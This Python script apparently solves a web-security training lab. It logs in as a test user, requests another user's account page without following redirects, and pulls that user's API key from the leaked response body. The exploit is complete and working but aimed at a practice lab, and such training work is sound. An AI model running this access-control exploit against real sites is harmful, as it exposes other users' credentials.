from ..utils import *
from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin

import requests
import re


def solve_lab(session, url):
    csrf = session.get_csrf_token("/login")

    username, password = "wiener", "peter"
    data = {"csrf": csrf, "username": username, "password": password}
    print_info(f'Logging in with the credentials "{username}:{password}"')
    resp = session.post_path("/login", data=data)

    soup = BeautifulSoup(resp.text, "lxml")
    invalid_creds = soup.find(text="Invalid username or password.")
    if invalid_creds:
        print_fail("Invalid credentials.")
    else:
        print_success("Successfully logged in.\n")

    url = urljoin(url, "/my-account")
    params = {"id": "carlos"}
    print_info(f'Visiting "{url}?{urlencode(params)}" without automatic redirects...')
    resp = session.get_path("/my-account", params=params, allow_redirects=False)

    if len(resp.text) != 0:
        print_info_secondary("Found leaked information in the HTTP body.")
    else:
        print_fail("Did not find leaked information in the HTTP body.")

    soup = BeautifulSoup(resp.text, "lxml")
    regex = re.compile(r"Your API Key is: (.*)")
    match = soup.find(text=regex)

    if match is None:
        print_fail("Unable to extract API key from HTTP response.")
    else:
        api_key = re.match(regex, match).group(1)
        print_success(f"API Key: {api_key}\n")
        session.submit_solution(api_key)
